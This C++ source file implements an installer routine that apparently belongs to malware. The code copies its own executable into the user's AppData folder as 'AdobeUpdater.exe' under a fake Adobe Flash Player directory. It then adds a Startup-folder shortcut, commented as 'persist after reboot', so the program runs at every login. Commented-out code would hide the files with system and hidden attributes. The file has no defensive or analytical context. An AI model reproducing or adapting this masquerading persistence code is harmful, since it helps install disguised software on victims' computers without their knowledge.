#include "install.h"

#include "main.h"

string Installer::GetInstallPath()
{
	return installPath;
}

string Installer::GetAppPath()
{
	return appPath;
}

int Installer::CreateShortcut(string ptchExecutableFileName, string ptchShortcutName)
{
	BOOL result = TRUE;

    result &= WritePrivateProfileString("InternetShortcut", 
               "URL", ptchExecutableFileName.c_str(), ptchShortcutName.c_str());
    result &= WritePrivateProfileString("InternetShortcut", 
               "IconIndex", "0", ptchShortcutName.c_str());
    result &= WritePrivateProfileString("InternetShortcut", 
               "IconFile", ptchExecutableFileName.c_str(), ptchShortcutName.c_str());
    
    return result;
}

int Installer::Install()
{
#ifdef NO_INSTALL

	installPath = ".";
	appPath = "AdobeUpdater.exe";

	return 1;

#endif

	// copy to the application data folder

	string appDataPath = string(getenv("AppData"));

	installPath = appDataPath + "\\Adobe";

	if (!CreateDirectory(installPath.c_str(), NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			DebugLog("Error creating installation folder.");
			return 0;
		}
	}

	installPath = installPath + "\\Flash Player";

	if (!CreateDirectory(installPath.c_str(), NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			DebugLog("Error creating installation folder.");
			return 0;
		}
	}

	string targetPath = installPath + "\\AdobeUpdater.exe";

	appPath = targetPath;

	char _sourcePath[256] = {0};
	GetModuleFileName(hInst, _sourcePath, 256);

	string sourcePath = string(_sourcePath);

	if (sourcePath != targetPath)
	{
		FILE *targetFile = fopen(targetPath.c_str(), "wb");
		FILE *sourceFile = fopen(sourcePath.c_str(), "rb");

		if (!targetFile)
		{
			DebugLog("Error writing installation target.");
			return 0;
		}

		if (!sourceFile)
		{
			DebugLog("Error reading installation source.");
			return 0;
		}

		fseek(sourceFile, 0, SEEK_END);
		DWORD sourceSize = ftell(sourceFile);

		fseek(sourceFile, 0, SEEK_SET);

		char buffer[0x1000];

		while (sourceSize)
		{
			DWORD bytesToRead;

			if (sourceSize < 0x1000)
			{
				bytesToRead = sourceSize;
			}
			else
			{
				bytesToRead = 0x1000;
			}

			fread(buffer, sizeof(char), bytesToRead, sourceFile);
			fwrite(buffer, sizeof(char), bytesToRead, targetFile);

			sourceSize -= bytesToRead;
		}

		fclose(sourceFile);
		fclose(targetFile);

		//if (!SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
		//{
		//	DebugLog("Warning: Unable to set hidden and system attributes to installation target.");
		//}
	}

	// persist after reboot

	string userProfilePath = string(getenv("UserProfile"));
	string startLinkPath   = userProfilePath + "\\Start Menu\\Programs\\Startup\\Adobe Updater.url";

	if (!CreateShortcut(targetPath, startLinkPath))
	{
		DebugLog("Error creating startup shortcut.");
		return 0;
	}

	//if (!SetFileAttributesA(startLinkPath.c_str(), FILE_ATTRIBUTE_SYSTEM))
	//{
	//	DebugLog("Warning: Unable to set system attributes on startup shortcut.");
	//}

	return 1;
}

int Installer::Shutdown()
{
	DebugLog("Installer shutting down...");

	return 0;
}